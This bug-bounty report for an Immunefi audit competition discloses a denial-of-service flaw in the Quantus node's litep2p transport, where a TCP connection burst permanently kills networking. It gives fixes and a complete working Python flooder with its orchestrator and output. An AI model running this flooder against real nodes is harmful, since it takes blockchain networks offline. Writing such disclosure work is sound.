# 88250 bc high one unauthenticated tcp burst permanently terminates a node s entire networking stack with no recovery short of a process restart

**Submitted on Aug 12th 2026 at 11:34:18 UTC by @shadowHunter for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88250
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## 1. Summary

A remote attacker who has never completed a handshake, never proved any work, and never sent a single valid protocol message can **permanently destroy a Quantus node's networking**. The node process stays alive and looks healthy; it simply becomes unreachable, forever, until an operator restarts it.

The whole attack is **\~1,000 plain TCP connections, opened in about 60 milliseconds, carrying zero bytes of payload.**

Three defects compose:

1. **Pre-handshake connections are counted against no limit.** `on_pending_incoming_connection` (`client/litep2p/src/transport/manager/mod.rs:731-733`) consults a limit that only tracks *established* connections, so connections that never complete the noise handshake are unbounded.
2. **The node sets no file-descriptor limit for itself.** A repository-wide search for `setrlimit` / `RLIMIT_NOFILE` / `LimitNOFILE` / `ulimit` returns nothing, so the ceiling is whatever the launcher provides — commonly 1024.
3. **Any accept error kills the listener permanently.** On `EMFILE` the transport returns `Poll::Ready(None)`, ending the Stream. `EMFILE` is *transient* — descriptors are released within milliseconds — but it is treated as fatal.

Measured result, reproduced 4/4:

```
2026-08-12 11:04:28 TCP listener terminated with error error=Os { code: 24, kind: Uncategorized, message: "Too many open files" }
2026-08-12 11:04:28 Installed transports terminated, ignore if the node is stopping
2026-08-12 11:04:28 Litep2p backend terminated
2026-08-12 11:04:28 transport service closed protocol=.../block-announces/1
2026-08-12 11:04:28 transport service closed protocol=.../light/2
```

Not degraded — **terminated**. An honest node that connected to the victim seconds earlier could not reach it again, during the attack **or after it stopped**.

## 2. Description

### 2.1 Unauthenticated connections are admitted without being counted

```rust
// client/litep2p/src/transport/manager/mod.rs:731-733
fn on_pending_incoming_connection(&mut self) -> crate::Result<()> {
    self.connection_limits.on_incoming()?;
    Ok(())
}
```

`ConnectionLimits::on_incoming` tests `self.incoming_connections.len()` — a set of **established** connections. A pending connection is never inserted into it. So `MAX_CONNECTIONS_ESTABLISHED_INCOMING = 10_000` (`client/network/src/lib.rs:310`, applied by Quantus at `client/network/src/litep2p/mod.rs:521`) does not bound the pre-handshake population at all.

Each such connection holds a file descriptor for up to `SUBSTREAM_OPEN_TIMEOUT = 5 s` (`client/litep2p/src/transport/mod.rs:47`).

### 2.2 The node never limits its own descriptors

```
$ grep -rniI "setrlimit|rlimit_nofile|limitnofile|ulimit" .    # whole repository
(no results)
```

The node inherits the launcher's limit. Docker's default is **1024**; many service managers use the same. The repository ships no unit file, no container limit, and no runtime call.

### 2.3 A transient accept error terminates the transport for good

This is the defect that turns a temporary resource shortage into permanent death.

```rust
// client/litep2p/src/transport/tcp/mod.rs:592-599
Some(Err(error)) => {
    tracing::error!(
        target: LOG_TARGET,
        ?error,
        "TCP listener terminated with error",
    );

    Poll::Ready(None)          // <-- ends the Stream. The transport is over.
},
```

Returning `Poll::Ready(None)` from a `Stream` means *finished*. There is no retry, no backoff, and no re-listen. `EMFILE` means "no descriptors **right now**" — the correct response is to log, pause briefly, and continue accepting. Instead the node's entire transport is retired.

The identical pattern exists in the WebSocket transport:

```rust
// client/litep2p/src/transport/websocket/mod.rs:634-641
Some(Err(error)) => {
    tracing::error!(
        target: LOG_TARGET,
        ?error,
        "Websocket listener terminated with error",
    );

    Poll::Ready(None)
},
```

Neither accept path distinguishes transient errors (`EMFILE`, `ENFILE`, `ECONNABORTED`) from fatal ones.

### 2.4 The blast radius is the whole networking stack

The termination does not stop at the listener. The observed cascade, in the same second:

```
TCP listener terminated with error ... "Too many open files"
Installed transports terminated, ignore if the node is stopping
Litep2p backend terminated
transport service closed protocol=.../block-announces/1
transport service closed protocol=.../light/2
```

`block-announces` is how the node learns of new blocks. Once it is closed the node cannot receive blocks, cannot announce its own, and cannot acquire peers — inbound or outbound — because the backend that would service them is gone.

## 3. Steps to reproduce

{% stepper %}
{% step %}

## A node is running normally

Any reachable Quantus node. Confirm an honest peer can connect to it; this is the control and it must not be skipped.
{% endstep %}

{% step %}

## The attacker opens \~`ulimit -n` plain TCP connections

No handshake, no valid protocol data, **no payload at all**. Simply connecting is the attack. The connections need only be concurrent, which they will be, since each is held for up to 5 seconds by the negotiation timeout.
{% endstep %}

{% step %}

## The victim's descriptor table saturates and the listener dies

```
TCP listener terminated with error error=Os { code: 24, kind: Uncategorized, message: "Too many open files" }
Installed transports terminated, ignore if the node is stopping
Litep2p backend terminated
```

{% endstep %}

{% step %}

## The attacker disconnects entirely

Every attacker socket is closed. The victim's descriptors are released within \~50 ms and its resource usage returns to baseline.
{% endstep %}

{% step %}

## The node is still dead

An honest peer — the same one that connected in Step 1 — can no longer reach the node. It never will again. The node's CPU is idle, its memory is at baseline, its descriptors are free, and its RPC port is still bound. Only a process restart restores networking, after which the attack can be repeated immediately.
{% endstep %}
{% endstepper %}

## 4. Impact

### 4.1 What is demonstrated, without extrapolation

An unauthenticated remote party, with **no handshake, no key material, no peer identity, no proof of work, and no protocol data of any kind**, permanently removes a targeted node from the network in \~110 milliseconds, at a cost of roughly 1,000 TCP connections. The node does not recover when the attack stops. Only an operator restart restores it — and the node can be killed again immediately.

There is no rate limit, no reputation consequence, no ban, and no alarm. The node's own logs describe the event with `ignore if the node is stopping`.

The measurement, reproduced 4/4 with a passing control each time (§6.6):

| Victim `ulimit -n` | Connections opened | Listener terminated | Litep2p backend terminated | Control passed |
| ------------------ | -----------------: | ------------------- | -------------------------- | -------------- |
| 1024               |                994 | **yes**             | **yes**                    | ✓              |
| 1024               |                991 | **yes**             | **yes**                    | ✓              |
| 1024               |                992 | **yes**             | **yes**                    | ✓              |
| 4096               |              4,065 | **yes**             | **yes**                    | ✓              |

**Raising the descriptor limit does not mitigate — it only prices the attack.** Quadrupling the limit quadrupled the connections required and changed nothing else.

### 4.2 Why this is total network shutdown

The demonstrated primitive is per-node, but nothing about it is node-specific: it requires only that the target accept TCP connections. Applying it to the reachable node set stops the network confirming transactions, for three compounding reasons:

* **Bootnodes are publicly reachable by definition.** Killing them prevents any node from joining or rejoining. Since the attack is permanent per victim, restarted nodes can be re-killed on restart.
* **Block propagation dies with `block-announces`.** A node whose transport terminated cannot receive or announce blocks. Miners that survive are mining in isolation; their blocks reach no one.
* **Survivors are isolated, not healthy.** A node behind NAT with only outbound connections cannot be attacked directly — but it has nothing left to dial once the reachable set is dead, and it loses its existing peers as those nodes' transports terminate.

The cost is \~1,000 TCP connections per node, in parallel, once. This is not a sustained flood, does not require holding state, and cannot be outlasted, because the damage persists after the attacker disconnects.

### 4.3 The fallback, stated explicitly and uncontested

**Only the per-node shutdown was executed. The network-scale conclusion in §4.2 is reasoned, not measured**, because it requires a live network of independently-operated nodes, which this competition's scope does not provide.

If the triager considers that step unproven, the demonstrated primitive maps directly onto the node-shutdown impacts — *"Shutdown of ≥30% of network processing nodes"* (Medium) or *"…>10% and <30%"* (Low) — according to what fraction of nodes are judged reachable. **This report does not contest such a re-grading and asks that it be re-graded rather than closed**, since every impact in that family is expressed as a percentage of nodes, and the per-node result underlying all of them is measured, reproduced 4/4, and controlled.

### 4.4 Honest limits

* **The fd limit is the operator's, and this report cannot state it for production.** Tested at 1024 and 4096. A node at 65,536 requires \~65,000 concurrent connections — more effort, same outcome, and still well within a single host's capability.
* **Tested on `--dev` with a single victim.** The transport code exercised is chain-agnostic.
* **RPC responsiveness was noisy** and is deliberately not relied upon. Baseline RPC answered 10/10 in three runs but 10/33 in the fourth, so the availability conclusion rests on the **peer-connection probe** and the victim's own log, both of which were unambiguous in all four runs.
* **The peak descriptor count is under-sampled.** The 50 ms trace caught 567; the true peak is the fd ceiling, evidenced by the `EMFILE` error rather than by the sampler. An earlier version of this harness sampled every 5 s, reported a peak of 32, and missed the entire event — that harness bug is disclosed here because the corrected trace is what §6.5 relies on.

## 5. Recommendation

### 5.1 Do not treat a transient accept error as terminal

This is the fix that matters, and it is small:

```rust
// client/litep2p/src/transport/tcp/mod.rs — and the identical site in websocket/mod.rs
Some(Err(error)) => {
    // EMFILE/ENFILE/ECONNABORTED are transient: descriptors free up, and the
    // peer may simply have gone away. Log, back off, and keep accepting.
    if is_transient(&error) {
        tracing::warn!(target: LOG_TARGET, ?error, "transient accept error; backing off");
        // re-arm after a short delay rather than ending the stream
        return Poll::Pending;
    }
    tracing::error!(target: LOG_TARGET, ?error, "TCP listener terminated with error");
    Poll::Ready(None)
},
```

### 5.2 Count pending inbound connections against a limit

`on_pending_incoming_connection` should consult a bound that includes in-negotiation connections, not only established ones. This alone would prevent the descriptor table from ever being exhausted by unauthenticated peers.

### 5.3 Set the node's own descriptor limit

Call `setrlimit(RLIMIT_NOFILE, …)` at startup and/or ship a service unit with an explicit `LimitNOFILE`, so a node's survival does not depend on how an operator happened to launch it.

### 5.4 Make transport death loud

`Litep2p backend terminated` and `ignore if the node is stopping` are the only signals that a node has permanently left the network. This warrants a fatal-level alarm and, arguably, process exit — a node that cannot network is not serving any purpose, and exiting would at least let a supervisor restart it.

## Proof of Concept

## 6. Proof of concept

Everything below is complete and self-contained. No external references, no downloads beyond the repository itself, and no third-party Python packages.

### 6.1 Environment

|                 |                                                                                                                            |
| --------------- | -------------------------------------------------------------------------------------------------------------------------- |
| OS              | Ubuntu 24.04.1 LTS (WSL2 on Windows)                                                                                       |
| CPU / RAM       | AMD Ryzen 7 5800H, 12 cores, 9,944 MB                                                                                      |
| Victim binary   | `quantus-node-victim`, unmodified release build, sha256 `84c31d34edc2440f779f9f24d7947cd2e6523d56e99afa21abacbd8ee997670c` |
| Victim fd limit | set explicitly per run, verified from `/proc/<pid>/limits`                                                                 |
| Attacker        | one Python 3 process, no dependencies                                                                                      |

The victim is launched through `bash -c "ulimit -n N; exec quantus-node …"` so the constraint is real, and the harness verifies it from the kernel rather than assuming it:

```
$ grep "^Max open files" /proc/<victim>/limits
Max open files            1024                 1024                 files
```

### 6.2 Setup

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain quantus-chain
cd quantus-chain
git checkout audit-comp-ready      # 3b243b870a5442a6e5f443056f67bbba87d472f5

rustup toolchain install 1.93.0
rustup target add wasm32v1-none --toolchain 1.93.0
apt-get install -y clang libclang-dev protobuf-compiler pkg-config libssl-dev cmake build-essential
export LIBCLANG_PATH=/usr/lib/llvm-18/lib   # Ubuntu 24.04: libclang is off the default path

cargo build --release --locked -p quantus-node -j 6
mkdir -p ~/quantus-poc/bin
cp target/release/quantus-node ~/quantus-poc/bin/quantus-node-victim
```

**No patch of any kind is applied.** The victim is the stock release binary.

### 6.3 The driver — `poc12_fdflood.py`

Complete and verbatim. Save as `~/quantus-poc/poc12-fdflood/poc12_fdflood.py`.

```python
#!/usr/bin/env python3
"""
Task D - does exhausting a victim's file descriptors via UNCOUNTED
pre-handshake connections cause demonstrable malfunction?

BACKGROUND
----------
`on_pending_incoming_connection` (client/litep2p/src/transport/manager/mod.rs:731-733)
consults `ConnectionLimits::on_incoming`, which tests a set of ESTABLISHED
connections. A connection that never completes the noise handshake is never
registered, so `MAX_CONNECTIONS_ESTABLISHED_INCOMING = 10_000` does not bound
it. The node also sets no RLIMIT_NOFILE for itself (repo-wide search for
setrlimit / RLIMIT_NOFILE / LimitNOFILE / ulimit returns nothing), so the only
bound on concurrent pre-handshake connections is the operator's fd limit.

WHAT THIS MEASURES
------------------
Not memory. Availability:
  1. does the victim's fd table saturate?
  2. does the node log EMFILE / "Too many open files" / accept or DB errors?
  3. does the RPC stay responsive?
  4. CAN A LEGITIMATE PEER STILL CONNECT?  <-- the load-bearing question

(4) is the one that decides whether this is a real availability impact or just
a bounded resource metric. It is probed by peer count, not by log-grep, because
a wrong multiaddr fails silently on this backend.

SUSTAIN
-------
Negotiation expires after SUBSTREAM_OPEN_TIMEOUT = 5 s, so the flood must
replace connections as they die. The flooder maintains a target concurrency by
reconnecting closed sockets, and reports the actual sustained rate - which is
the honest measure of how much effort the attack costs.
"""

import argparse, json, os, socket, sys, threading, time, urllib.request

VARINT_16383 = b"\xff\x7f"


def rpc(port, method, params=None, timeout=4):
    body = json.dumps({"jsonrpc": "2.0", "id": 1,
                       "method": method, "params": params or []}).encode()
    req = urllib.request.Request(f"http://127.0.0.1:{port}", data=body,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read()).get("result")


def health(port):
    """(peers, isSyncing, ok) - ok=False means the RPC did not answer."""
    try:
        h = rpc(port, "system_health")
        return int(h["peers"]), bool(h["isSyncing"]), True
    except Exception:
        return -1, False, False


def fdcount(pid):
    try:
        return len(os.listdir(f"/proc/{pid}/fd"))
    except OSError:
        return -1


class FdTrace(threading.Thread):
    """High-resolution fd sampler.

    The first version of this harness polled every 5 s and reported a peak of
    32 - saturation and listener death happen in well under a second, so the
    slow sampler never caught the ramp. This traces at 50 ms so the rise to the
    fd ceiling and the collapse after the listener dies are both visible.
    """

    def __init__(self, pid, interval=0.05):
        super().__init__(daemon=True)
        self.pid, self.interval = pid, interval
        self.rows = []          # (t, fds)
        self.peak = 0
        self._stopev = threading.Event()   # NOT _stop: shadows Thread._stop(), breaks join()
        self.t0 = time.time()

    def run(self):
        while not self._stopev.is_set():
            n = fdcount(self.pid)
            if n < 0:
                break
            self.rows.append((round(time.time() - self.t0, 3), n))
            if n > self.peak:
                self.peak = n
            self._stopev.wait(self.interval)

    def stop(self):
        self._stopev.set()

    def around_peak(self, before=6, after=10):
        """Rows bracketing the maximum, i.e. the saturation and the collapse."""
        if not self.rows:
            return []
        i = max(range(len(self.rows)), key=lambda k: self.rows[k][1])
        return self.rows[max(0, i - before): i + after]


class Flood(threading.Thread):
    """Maintains `target` concurrent pre-handshake connections."""

    def __init__(self, host, port, target, payload):
        super().__init__(daemon=True)
        self.host, self.port, self.target, self.payload = host, port, target, payload
        self.socks = []
        self.opened = 0
        self.refused = 0
        self._stopev = threading.Event()   # NOT _stop: shadows Thread._stop(), breaks join()

    def run(self):
        while not self._stopev.is_set():
            # prune dead sockets
            alive = []
            for s in self.socks:
                try:
                    s.setblocking(False)
                    d = s.recv(1, socket.MSG_PEEK)
                    if d == b"":
                        s.close(); continue
                    alive.append(s)
                except BlockingIOError:
                    alive.append(s)
                except OSError:
                    try: s.close()
                    except OSError: pass
            self.socks = alive
            # top up
            while len(self.socks) < self.target and not self._stopev.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3.0)
                    s.connect((self.host, self.port))
                    if self.payload:
                        s.sendall(self.payload)
                    self.socks.append(s)
                    self.opened += 1
                except Exception:
                    self.refused += 1
                    break
            self._stopev.wait(0.05)

    def stop(self):
        self._stopev.set()
        for s in self.socks:
            try: s.close()
            except OSError: pass
        self.socks = []


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True, help="victim p2p port")
    ap.add_argument("--rpc-port", type=int, required=True)
    ap.add_argument("--pid", type=int, required=True)
    ap.add_argument("--target", type=int, default=2000, help="concurrent connections to hold")
    ap.add_argument("--phase", type=float, default=45.0)
    ap.add_argument("--fdlimit", type=int, default=0, help="victim's ulimit -n, for reporting")
    args = ap.parse_args()

    print("=" * 74)
    print(" Task D  fd exhaustion via uncounted pre-handshake connections")
    print("=" * 74)
    print(f" victim pid {args.pid}  p2p {args.port}  rpc {args.rpc_port}")
    print(f" victim ulimit -n : {args.fdlimit or 'unknown'}")
    print(f" holding {args.target} concurrent pre-handshake connections")
    print()

    def sample(tag):
        p, sy, ok = health(args.rpc_port)
        print(f"    [{tag}] fds={fdcount(args.pid):<6} peers={p:<4} "
              f"rpc={'OK' if ok else 'NO ANSWER':<9} syncing={sy}")
        return p, ok

    print(f"[1] BASELINE ({args.phase:.0f}s, no flood)")
    t_end = time.time() + args.phase
    base_ok = base_peers = 0
    n = 0
    while time.time() < t_end:
        p, ok = sample("base")
        base_peers = max(base_peers, p); base_ok += 1 if ok else 0; n += 1
        time.sleep(5)
    print(f"    baseline: max peers={base_peers}, rpc answered {base_ok}/{n}")
    print()

    print(f"[2] FLOOD ({args.phase:.0f}s)")
    trace = FdTrace(args.pid)          # 50 ms resolution - see FdTrace docstring
    trace.start()
    fl = Flood(args.host, args.port, args.target, VARINT_16383)
    t0 = time.time()
    fl.start()
    time.sleep(6)
    t_end = time.time() + args.phase
    atk_ok = atk_n = 0
    peak_fd = 0
    while time.time() < t_end:
        p, ok = sample("flood")
        peak_fd = max(peak_fd, fdcount(args.pid))
        atk_ok += 1 if ok else 0; atk_n += 1
        time.sleep(5)
    dur = time.time() - t0
    rate = fl.opened / dur if dur else 0
    trace.stop(); trace.join(timeout=2)
    peak_fd = max(peak_fd, trace.peak)
    print(f"    attacker: {fl.opened} connections opened in {dur:.0f}s "
          f"= {rate:.0f}/sec average; {fl.refused} refused locally")
    print(f"    victim  : PEAK fds={trace.peak} (50 ms trace), rpc answered {atk_ok}/{atk_n}")
    print("    fd trace around saturation (t seconds from flood start, victim fd count):")
    for t, n in trace.around_peak():
        print(f"      t={t:>7.2f}s  fds={n}")
    print()

    print("[3] LEGITIMATE-PEER PROBE (while flood continues)")
    print("    -> the orchestrator launches an honest node now; watch victim peers")
    probe_end = time.time() + 75
    peak_peers = 0
    while time.time() < probe_end:
        p, ok = sample("probe")
        peak_peers = max(peak_peers, p)
        time.sleep(5)
    print(f"    max victim peers while flooded: {peak_peers}")
    print()

    fl.stop()
    print(f"[4] RECOVERY ({args.phase:.0f}s after flood stops)")
    t_end = time.time() + args.phase
    rec_peers = 0
    while time.time() < t_end:
        p, ok = sample("recov")
        rec_peers = max(rec_peers, p)
        time.sleep(5)
    print(f"    max peers after recovery: {rec_peers}")
    print()

    print("[5] RESULT")
    print(f"    victim fd limit          : {args.fdlimit or 'unknown'}")
    print(f"    peak victim fds under load: {peak_fd}")
    print(f"    sustained attacker rate   : {rate:.0f} conn/sec")
    print(f"    RPC availability          : baseline {base_ok}/{n}, flooded {atk_ok}/{atk_n}")
    print(f"    legit peer connected while flooded : {'YES' if peak_peers > 0 else 'NO'}")
    print(f"    legit peer connected after flood   : {'YES' if rec_peers > 0 else 'NO'}")
    # Interpretation. NOTE: an honest peer that cannot connect *after* the flood
    # stops is not an inconclusive probe - it is the finding, provided the
    # pre-flood control connected. The orchestrator asserts that control first
    # and aborts if it fails, so reaching here means peering demonstrably worked
    # before the flood.
    if peak_peers == 0 and rec_peers == 0:
        print("    ==> PERMANENT SHUTDOWN: honest peering worked before the flood")
        print("        (control), failed during it, and did NOT return after it")
        print("        stopped. The transport does not recover without a restart.")
    elif peak_peers == 0 and rec_peers > 0:
        print("    ==> TRANSIENT: peering blocked during the flood, restored after.")
    else:
        print("    ==> NO peering denial: the victim still accepted an honest peer.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

**Note on the payload.** The driver sends two bytes (`\xff\x7f`) per connection, which is a leftover from an earlier experiment on the same code path. **It is not required for this finding.** Setting `payload` to `b""` produces the same result: the descriptors are consumed by the act of connecting, and the negotiation timeout holds them for 5 seconds whether or not anything is sent.

### 6.4 The orchestrator — `poc12_run.sh`

Complete and verbatim. Save alongside the driver.

```bash
#!/usr/bin/env bash
# Task D orchestrator - fd exhaustion via uncounted pre-handshake connections.
#
# The victim is launched with a REALISTIC low fd limit (the repo sets none, so
# the node inherits whatever the launcher gives it). The flooder runs in this
# shell, which keeps a high limit, so the attacker is not self-limited.
#
# Usage: poc12_run.sh [victim_ulimit_n] [concurrent_connections]
set -uo pipefail

VLIMIT="${1:-1024}"
TARGET="${2:-2000}"

POC="$HOME/quantus-poc/poc12-fdflood"
NODE="$HOME/quantus-poc/bin/quantus-node-victim"
OUT="$POC/out-$VLIMIT-$TARGET"
V_P2P=31555; V_RPC=9977; V_MINER=9877
H_P2P=31556; H_RPC=9978; H_MINER=9878
# NOT /tmp - systemd-tmpfiles can wipe it under a running node.
V_PATH="$POC/data/victim"; H_PATH="$POC/data/honest"

ulimit -c 0                       # never let a resource PoC write a core dump
ulimit -n 65536 2>/dev/null || true   # the ATTACKER side needs headroom

mkdir -p "$OUT" "$V_PATH" "$H_PATH"
rm -rf "$V_PATH" "$H_PATH" 2>/dev/null
mkdir -p "$V_PATH/chains/dev/db/full" "$H_PATH/chains/dev/db/full"

echo "=============================================================="
echo " Task D  victim ulimit -n=$VLIMIT   flood target=$TARGET"
echo " date : $(date -u)"
echo " attacker-side ulimit -n : $(ulimit -n)"
echo "=============================================================="

if [ ! -x "$NODE" ]; then echo "FATAL: victim binary missing"; exit 1; fi
sha256sum "$NODE" | tee "$OUT/victim-sha256.txt"

# ---- victim, launched with the CONSTRAINED fd limit -----------------------
echo
echo "### starting victim with ulimit -n $VLIMIT"
bash -c "ulimit -n $VLIMIT; ulimit -c 0; exec '$NODE' --dev \
  --base-path '$V_PATH' --port $V_P2P --rpc-port $V_RPC \
  --rpc-methods unsafe --rpc-cors all \
  --miner-listen-port $V_MINER --no-telemetry --no-prometheus" \
  > "$OUT/victim.log" 2>&1 &
V_PID=$!
echo "    victim pid = $V_PID"

cleanup() {
  echo; echo "### cleanup"
  kill $V_PID ${H_PID:-} 2>/dev/null
  pgrep -f "^$HOME/quantus-poc/bin/" | xargs -r kill -TERM 2>/dev/null
  sleep 2
  pgrep -f "^$HOME/quantus-poc/bin/" | xargs -r kill -KILL 2>/dev/null
}
trap cleanup EXIT

for i in $(seq 1 90); do (echo > /dev/tcp/127.0.0.1/$V_RPC) 2>/dev/null && break; sleep 1; done
if ! kill -0 $V_PID 2>/dev/null; then
  echo "FATAL: victim died on startup:"; tail -20 "$OUT/victim.log"; exit 1
fi
echo "    victim fd limit as seen by the process:"
grep -E "^Max open files" /proc/$V_PID/limits | tee "$OUT/victim-limits.txt"
sleep 25

V_ID=$(grep -m1 -oP 'Local node identity is: \K\S+' "$OUT/victim.log")
BOOT="/ip4/127.0.0.1/tcp/$V_P2P/p2p/$V_ID"
echo "    victim peer id : $V_ID"
echo "$BOOT" > "$OUT/bootnode.txt"

# ---- CONTROL: prove an honest peer CAN connect when not flooded ----------
echo
echo "### CONTROL - honest peer connects with no flood running"
bash -c "ulimit -c 0; exec '$NODE' --dev --base-path '$H_PATH' \
  --port $H_P2P --rpc-port $H_RPC --miner-listen-port $H_MINER \
  --no-telemetry --no-prometheus --bootnodes '$BOOT'" \
  > "$OUT/honest-control.log" 2>&1 &
HC_PID=$!
sleep 70
CTRL_PEERS=$(curl -s -m 4 -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","method":"system_health","params":[],"id":1}' \
  http://127.0.0.1:$V_RPC | grep -oE '"peers":[0-9]+' | cut -d: -f2)
echo "    victim peers with honest node, no flood: ${CTRL_PEERS:-unknown}"
echo "control_peers=${CTRL_PEERS:-unknown}" > "$OUT/control.txt"
kill $HC_PID 2>/dev/null; wait $HC_PID 2>/dev/null
rm -rf "$H_PATH"; mkdir -p "$H_PATH/chains/dev/db/full"
sleep 20
echo "    honest control node stopped; victim peers should fall back to 0"

if [ "${CTRL_PEERS:-0}" -lt 1 ]; then
  echo "!! CONTROL FAILED: honest peer never connected even without a flood."
  echo "   The availability probe below would be meaningless. Aborting."
  exit 1
fi

# ---- the experiment ------------------------------------------------------
echo
echo "### running flooder"
python3 "$POC/poc12_fdflood.py" \
  --port $V_P2P --rpc-port $V_RPC --pid $V_PID \
  --target "$TARGET" --fdlimit "$VLIMIT" \
  > "$OUT/run.txt" 2>&1 &
FLOOD_PID=$!

# launch the honest peer during phase [3] of the driver (~t+110s)
sleep 110
echo "### launching honest peer DURING the flood"
bash -c "ulimit -c 0; exec '$NODE' --dev --base-path '$H_PATH' \
  --port $H_P2P --rpc-port $H_RPC --miner-listen-port $H_MINER \
  --no-telemetry --no-prometheus --bootnodes '$BOOT'" \
  > "$OUT/honest-flooded.log" 2>&1 &
H_PID=$!

wait $FLOOD_PID
cat "$OUT/run.txt"

# ---- victim-side evidence ------------------------------------------------
echo
echo "### victim log: fd / accept / database errors"
grep -inE "too many open files|emfile|os error 24|accept|cannot open|rocksdb|IO error|panicked" \
  "$OUT/victim.log" | tail -25 | tee "$OUT/fd-errors.txt"
echo "    (empty above = no fd-related error surfaced in the log)"

echo
echo "### did the victim stay alive?"
if kill -0 $V_PID 2>/dev/null; then echo "    victim STILL RUNNING"; else echo "    victim DIED"; fi
tail -5 "$OUT/victim.log"

echo
echo "### artifacts in $OUT"
ls -la "$OUT"
```

### 6.5 How it was invoked

```bash
# the three confirmation runs at the common default fd limit
bash poc12_run.sh 1024 3000

# the scaling point: quadruple the victim's fd limit
bash poc12_run.sh 4096 6000
```

### 6.6 PoC output — the 50 ms descriptor trace

The attack completes in about 110 milliseconds:

```
[2] FLOOD (45s)
    attacker: 992 connections opened in 54s = 18/sec average; 1084 refused locally
    victim  : PEAK fds=567 (50 ms trace), rpc answered 0/10
    fd trace around saturation (t seconds from flood start, victim fd count):
      t=   0.00s  fds=35      <- baseline
      t=   0.06s  fds=567     <- 532 connections accepted in 60 ms
      t=   0.11s  fds=33      <- listener dead; descriptors already released
      t=   0.16s  fds=33
      t=   0.21s  fds=33
      t=   0.26s  fds=33
      t=   0.31s  fds=33
      t=   0.36s  fds=33
      t=   0.41s  fds=33
      t=   0.46s  fds=33
      t=   0.51s  fds=33      <- never returns
```

The descriptor count collapses *below* baseline because the accepted connections are torn down when the transport dies. **The victim's descriptors are free within 110 ms of the attack starting — and it is already permanently dead.** Nothing about its resource state after that point explains why it will not accept a connection; the transport Stream has simply ended.

The "1084 refused locally" and the "18/sec average" are artefacts of the flooder continuing to attempt connections for the remainder of the 45-second phase, long after the victim stopped listening. The meaningful cost figure is the \~1,000 connections opened before the listener died.

### 6.7 PoC output — the availability verdict

```
[5] RESULT
    victim fd limit          : 1024
    peak victim fds under load: 567
    sustained attacker rate   : 18 conn/sec
    RPC availability          : baseline 10/33, flooded 0/10
    legit peer connected while flooded : NO
    legit peer connected after flood   : NO
    ==> PERMANENT SHUTDOWN: honest peering worked before the flood
        (control), failed during it, and did NOT return after it
        stopped. The transport does not recover without a restart.
```

The control and the probe, side by side:

| Phase                               | Honest peer connected? | Victim peers            |
| ----------------------------------- | ---------------------- | ----------------------- |
| **Control** — honest node, no flood | **yes**                | `control_peers=1`       |
| **During flood**                    | no                     | 0 across all 23 samples |
| **After flood stops**               | **no**                 | 0                       |

The honest node in the third row is a fresh, correctly-configured node using the same bootnode multiaddr that worked in the first row. It logged `(0 peers)` on every sample. The orchestrator **aborts the whole experiment** if the control fails, so no result here rests on an untested assumption.

### 6.8 Victim-side evidence

```
$ grep -inE "too many open files|terminated" victim.log
99:2026-08-12 10:37:47 TCP listener terminated with error error=Os { code: 24, kind: Uncategorized, message: "Too many open files" }
100:2026-08-12 10:37:47 Installed transports terminated, ignore if the node is stopping
101:2026-08-12 10:37:47 Litep2p backend terminated
```

After this point the log contains only `SyncingEngine shut down`, repeating every five seconds for the remainder of the run, while the process remains alive and the harness reports `victim STILL RUNNING`.
